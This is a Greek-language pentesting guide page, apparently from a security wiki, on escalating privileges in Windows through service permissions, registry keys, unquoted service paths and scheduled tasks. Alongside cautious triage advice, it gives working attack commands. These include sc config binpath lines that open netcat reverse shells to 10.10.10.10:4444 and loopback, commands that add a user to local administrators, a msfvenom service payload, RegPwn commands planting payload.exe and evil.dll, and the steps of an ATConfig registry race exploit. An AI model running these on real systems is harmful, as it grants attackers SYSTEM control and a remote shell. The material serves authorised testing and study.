Μια εφαρμογή που ανοίγει αυτόματα projects από έναν drop directory στον οποίο μπορεί να γράψει ένας χρήστης με χαμηλότερα προνόμια, περνά ένα όριο εμπιστοσύνης εισόδου υπό τον λογαριασμό του importer. Ελέγξτε την **ακριβή διαδρομή στην οποία υπάρχει δυνατότητα εγγραφής**, τη διεργασία ή την εργασία που την ανοίγει, την ταυτότητα με την οποία εκτελείται και το build του parser. Ένα [ιστορικό ζήτημα κατά το άνοιγμα/την επαναφορά project στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε XML external entities στα metadata του project· μια network entity στα Windows μπορούσε να προκαλέσει authentication από τον λογαριασμό που έκανε import, αν το [outbound SMB και η πολιτική NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) το επέτρεπαν. Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεσης πρόσβασης διαχειριστή: η απόκριση πρέπει να μπορεί να αξιοποιηθεί μέσω ξεχωριστής εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ τα τρέχοντα builds πρέπει να αξιολογούνται με βάση την πραγματική κατάσταση των patches τους. Μην ανοίγετε crafted project κατά την παθητική απαρίθμηση· εξετάστε τη ροή εισαγωγής και τα ACL.

## Υπηρεσίες

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές, μόνο για ανάγνωση αίτημα πρόσβασης [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService` επιστρέφει ένα handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης υπηρεσίας που ζητήθηκαν κατά τη δημιουργία· το μεταγενέστερο άνοιγμα της υπηρεσίας εκ νέου εκτελεί ξεχωριστό έλεγχο πρόσβασης και μπορεί να αποτύχει, ακόμη κι αν μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το effective local ή remote token, τα δικαιώματα του handle που παραχωρήθηκαν, τον λογαριασμό της υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του executable. Μη δημιουργείτε ούτε εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια διαδρομή απομακρυσμένης εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει το **ίδιο network logon**, το υποκείμενο NTFS ACL του και μια τοπική διαδρομή executable που μπορεί να εκτελέσει ο λογαριασμός της υπηρεσίας. Ένας λογαριασμός που δεν είναι διαχειριστής μπορεί να περάσει αυτό το όριο αν υπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και η δυνατότητα τοποθέτησης αρχείου· ένα administrative share δεν είναι απαραίτητη προϋπόθεση. Η δυνατότητα εγγραφής στο share από μόνη της ή μια ένδειξη ότι μπορεί να δημιουργηθεί υπηρεσία μέσω SCM από μόνη της, δεν αποδεικνύει ότι μπορεί να εκκινηθεί η νέα υπηρεσία με υψηλότερη ταυτότητα.

Μια υπάρχουσα υπηρεσία ενδέχεται να εκτελεί ένα helper executable κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο lifecycle event, ακόμη κι όταν αυτό το helper απουσιάζει από το `ImagePath` της. Αν το όνομα του helper επιλύεται σε κατάλογο στον οποίο μπορεί να γράψει χρήστης με χαμηλότερα προνόμια και η υπηρεσία εκτελείται με υψηλότερη ταυτότητα, ένα αρχείο helper που λείπει μπορεί υπό προϋποθέσεις να αντικατασταθεί. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του helper**, την επιλυμένη διαδρομή του executable και τη σειρά αναζήτησης, τα δικαιώματα δημιουργίας στον κατάλογο, την ταυτότητα της υπηρεσίας και την ύπαρξη διαθέσιμου lifecycle trigger. Ένας κατάλογος υπηρεσίας στον οποίο υπάρχει δυνατότητα εγγραφής ή ένα αρχείο που λείπει, από μόνο του δεν αποδεικνύει ότι η υπηρεσία φορτώνει το αρχείο· κατά την παθητική εξέταση, μην εκκινείτε και μην τερματίζετε την υπηρεσία.

Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START` επιτρέπει την παροχή ορισμάτων στο `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew) και διαφέρει από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Εξετάστε τον κώδικα της υπηρεσίας ή την τεκμηριωμένη διεπαφή της πριν θεωρήσετε ότι το δικαίωμα εκκίνησης είναι κάτι περισσότερο από δικαίωμα ελέγχου. Αν χρησιμοποιεί όρισμα που επιλέγει ο caller ως διαδρομή log ή export, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα στην εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **αρχείου που δημιουργείται**. Η εγγραφή σε προστατευμένο κατάλογο μπορεί να οδηγήσει σε escalation μόνο αν υπάρχει ξεχωριστός privileged consumer ή loader που αποδέχεται αυτό το αρχείο· ένα log στο οποίο υπάρχει δυνατότητα εγγραφής ή το δικαίωμα εκκίνησης από μόνα τους δεν αρκούν. Κατά την παθητική απογραφή, μην εκκινείτε την υπηρεσία και μην δημιουργείτε δοκιμαστικό αρχείο.

Για έναν monitoring agent NSClient++, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη για έλεγχο των ρυθμίσεων**: μπορεί να περιέχει web credentials, ενώ το `boot.ini` μπορεί να ανακατευθύνει τη ρύθμιση σε άλλη τοποθεσία. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον WEB listener και την πολιτική πρόσβασης, καθώς και το αν ο authenticated ρόλος μπορεί να αλλάξει ρυθμίσεις ή scripts. Για privileged execution απαιτείται επιπλέον το `CheckExternalScripts` (ή κάποια άλλη ενεργοποιημένη διαδρομή εκτέλεσης), ένα ενεργό δικαίωμα καταχώρισης ή τροποποίησης μιας εντολής και ένα trigger που την εκτελεί υπό την ταυτότητα της υπηρεσίας. Ένας listener μόνο για loopback μπορεί να είναι προσβάσιμος από τοπικό χρήστη, αλλά μόνο η διαδρομή του αρχείου, ο κωδικός πρόσβασης ή ο listener δεν αποδεικνύουν την ύπαρξη αυτών των δικαιωμάτων. Εξετάστε τα metadata και τα permissions χωρίς να εμφανίσετε secrets ή να καλέσετε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφαλείας για web και scripts](https://nsclient.org/docs/setup/securing/) και τη [ρύθμιση external scripts](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για μια υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, εξετάστε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: το [NSSM αποθηκεύει εκεί την εφαρμογή child](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο ρυθμισμένος working directory της. Ελέγξτε το child executable και τα ACL των γονικών καταλόγων του πριν θεωρήσετε ότι τα permissions του wrapper περιγράφουν πλήρως το όριο ασφαλείας της υπηρεσίας. Ένα τοπικό WCF ή SOAP endpoint που εκθέτει αυτό το child αποτελεί ξεχωριστή ένδειξη προς διερεύνηση: επιβεβαιώστε ότι ο listener είναι προσβάσιμος από τον χρήστη με χαμηλότερα προνόμια, ότι η συγκεκριμένη operation αποδέχεται την είσοδό του και ότι το service child εκτελεί την unsafe operation υπό υψηλότερη ταυτότητα. Ο λογαριασμός της υπηρεσίας, ένα endpoint URL ή μια διαδρομή στην οποία υπάρχει δυνατότητα εγγραφής δεν αποδεικνύουν από μόνα τους ότι μπορεί να γίνει escalation· μην καλείτε service operations κατά την παθητική απαρίθμηση.

Για μια custom WCF operation, ακολουθήστε τη διαδρομή μιας συμβολοσειράς που ελέγχει ο caller μέχρι οποιοδήποτε PowerShell runspace. Το [`Pipeline.Commands.AddScript` προσθέτει κείμενο script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), ενώ το [`Pipeline.Invoke` εκτελεί το pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding` με Windows transport credentials](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) κάνει authentication του client, αλλά η εξουσιοδότηση για κλήση της **συγκεκριμένης** operation και η effective identity του runspace πρέπει να ελεγχθούν ξεχωριστά. Μια διαδρομή από είσοδο caller με χαμηλότερα προνόμια προς το `AddScript` υπό υψηλότερη ταυτότητα υπηρεσίας αποτελεί όριο εκτέλεσης κώδικα· μια listening port, ένας authenticated client ή μια μη χρησιμοποιούμενη method σε άσχετο assembly δεν αποτελούν από μόνα τους απόδειξη. Εξετάστε στατικά την εγκατεστημένη υπηρεσία, το contract, την εξουσιοδότηση και τις ρυθμίσεις impersonation, χωρίς να καλέσετε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν ορισμένες συνθήκες (δραστηριότητα σε named pipe/RPC endpoint, ETW events, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να εκκινήσετε privileged services ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις Visual Studio με εργαλεία C/C++ ενδέχεται να περιλαμβάνουν την `VSStandardCollectorService150`, μια υπηρεσία διαγνωστικών ρυθμισμένη να εκτελείται ως `LocalSystem`. Το [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) αξιοποίησε ένα race με junction και object-manager-link για να ανακατευθύνει την επαναφορά DACL της υπηρεσίας. Το escalation που παρουσιάστηκε απαιτούσε επίσης μια αξιοποιήσιμη διαδρομή επιδιόρθωσης MSI μέσω του Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το component διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική διαλογή, ελέγξτε τον λογαριασμό και τη διαδρομή του binary αυτής της υπηρεσίας, ελέγξτε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση των patches του εγκατεστημένου component. Μια καταχώριση υπηρεσίας, η έκδοση του προϊόντος Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι ο host είναι ευάλωτος. Η εξέταση δεν απαιτεί την εκκίνηση της υπηρεσίας ή την εκτέλεση επιδιόρθωσης.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία.

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγχετε το απαιτούμενο επίπεδο δικαιωμάτων για κάθε υπηρεσία.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανίζεται αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, επειδή είναι απενεργοποιημένη ή επειδή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (στα XP SP1)**

**Μια άλλη λύση παράκαμψης** αυτού του προβλήματος είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση της διαδρομής του δυαδικού αρχείου της υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα προνόμια μπορούν να κλιμακωθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του binary της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση δικαιωμάτων, παρέχοντας τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση κυριότητας και την αναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Κληρονομεί επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα στα binary υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή προνομιούχος λογαριασμός domain, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να γίνει hijack με **αντικατάσταση του binary και επανεκκίνηση της υπηρεσίας**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να βρείτε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACL που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική διαδικασία εκμετάλλευσης είναι:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το δυαδικό αρχείο είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το δυαδικό αρχείο της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο δυαδικό αρχείο υπηρεσίας.
4. Επανεκκινήστε την υπηρεσία με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε να γίνει επανεκκίνηση ή να ενεργοποιηθεί κάποιο trigger της υπηρεσίας).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν ξεκινά αυτόματα κατά την εκκίνηση, αν έχει ενέργεια αποτυχίας που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης του registry των υπηρεσιών

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο registry υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα **registry** υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ο αρχικός έλεγχος δικαιωμάτων διατυπώθηκε ως εξής:

Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Ελέγξτε αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο registry σε ένα συγκεκριμένο service key. Μια εγγραφή ACL από μόνη της δεν αποδεικνύει ότι υπάρχει πραγματική πρόσβαση: σημασία έχουν οι εγγραφές άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα του registry key είναι ξεχωριστά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του service object. Η κλιμάκωση δικαιωμάτων απαιτεί επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης υπηρεσίας, έναν τρόπο ενεργοποίησης της υπηρεσίας και μια ταυτότητα υπηρεσίας με υψηλότερα προνόμια. Δείτε τα [δικαιώματα registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και την [αναφορά δικαιωμάτων πρόσβασης υπηρεσίας](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε το Path του binary που εκτελείται:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race με registry symlink για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα **symbolic link race** στο registry μπορεί να ανακατευθύνει αυτή την προνομιούχα εγγραφή σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας primitive για αυθαίρετη εγγραφή τιμής HKLM.<sup>[[18]](#references)</sup>

Βασικές τοποθεσίες (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή τις μεταβάσεις secure desktop και είναι εγγράψιμο από τον χρήστη.

Ροή εκμετάλλευσης (CVE-2026-24291 / ATConfig):

1. Συμπλήρωσε την τιμή **HKCU ATConfig** που θέλεις να εγγράψει το SYSTEM.
2. Ενεργοποίησε την αντιγραφή του secure desktop (π.χ., **LockWorkstation**), η οποία ξεκινά τη ροή του AT broker.
3. **Κέρδισε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικατάστησε το κλειδί **HKLM Session ATConfig** με ένα **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το SYSTEM εγγράφει την επιλεγμένη από τον attacker τιμή στη διαδρομή στην οποία έχει γίνει ανακατεύθυνση.

Μόλις αποκτήσεις δυνατότητα αυθαίρετης εγγραφής τιμής HKLM, κάνε pivot σε LPE παρακάμπτοντας τιμές ρυθμίσεων υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επίλεξε μια υπηρεσία που μπορεί να ξεκινήσει ένας κανονικός χρήστης (π.χ., **`msiserver`**) και ενεργοποίησέ την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Ενδεικτικά εργαλεία (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Δικαιώματα AppendData/AddSubdirectory στο registry των Services

Αν έχετε αυτό το δικαίωμα σε ένα registry, σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries μέσα σε αυτό**. Στην περίπτωση των Windows services, αυτό **αρκεί για να εκτελέσετε αυθαίρετο κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα της που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Καταγράψτε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας όσες ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται σε περίπτωση αποτυχίας μιας υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η κλιμάκωση προνομίων. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Στόχοι script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με αρχείο `.bat` ή `.cmd`, ελέγξτε το script που αναφέρεται στα **ορίσματα ενέργειας**, καθώς και το `cmd.exe`. Το ίδιο ισχύει για το ρητό όρισμα αρχείου ενός interpreter, όπως το `-File` του PowerShell. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε και τα ACL του script που αναφέρεται· οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή ένας γονικός κατάλογος στον οποίο μπορεί να γράψει ο caller αποτελεί ένδειξη για εκτέλεση μεταξύ λογαριασμών μόνο όταν το ρυθμισμένο principal της εργασίας διαφέρει από τον caller και η εργασία φτάνει πράγματι σε αυτή την ενέργεια. Ένα ACL που επιτρέπει μόνο προσθήκη μπορεί να έχει σημασία για scripts, αλλά ένα προηγούμενο `exit` ή άλλη ροή ελέγχου μπορεί να καταστήσει τις γραμμές που προστέθηκαν μη προσπελάσιμες. Επιβεβαιώστε τα πραγματικά ACL, το [πλαίσιο εκτέλεσης της εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον κατάλογο εργασίας, το trigger και την πολιτική ελέγχου εφαρμογών πριν ισχυριστείτε ότι υπάρχει κλιμάκωση. Η απογραφή δεν πρέπει να τροποποιεί το script ή να εκκινεί την εργασία.

## Named streams σε προσβάσιμα αρχεία

Στο NTFS, ένα αναγνώσιμο αρχείο μπορεί να έχει ένα named `:$DATA` stream, το περιεχόμενο του οποίου δεν εμφανίζεται σε μια συνηθισμένη καταχώριση καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων αντιγράφων ασφαλείας ή αρχείων ρυθμίσεων, ελέγξτε τα **ονόματα και τα μεγέθη** των streams πριν ανοίξετε οποιοδήποτε περιεχόμενο· τα Windows τα εκθέτουν μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), καθώς και μέσω της εντολής PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα stream που υποδηλώνει μυστικό αποτελεί απλώς ένδειξη. Ελέγξτε την πραγματική πρόσβαση ανάγνωσης του αρχείου, την υποστήριξη streams από το filesystem, αν το stream περιέχει αξιοποιήσιμα διαπιστευτήρια και σε ποιον λογαριασμό γίνεται πράγματι η αυθεντικοποίηση. Αποφύγετε τις αναδρομικές σαρώσεις streams και την εμφάνιση του περιεχομένου τους κατά τη συνήθη απαρίθμηση.

## Είσοδοι βοηθητικού προγράμματος του Windows Driver Kit σε προγραμματισμένες εργασίες

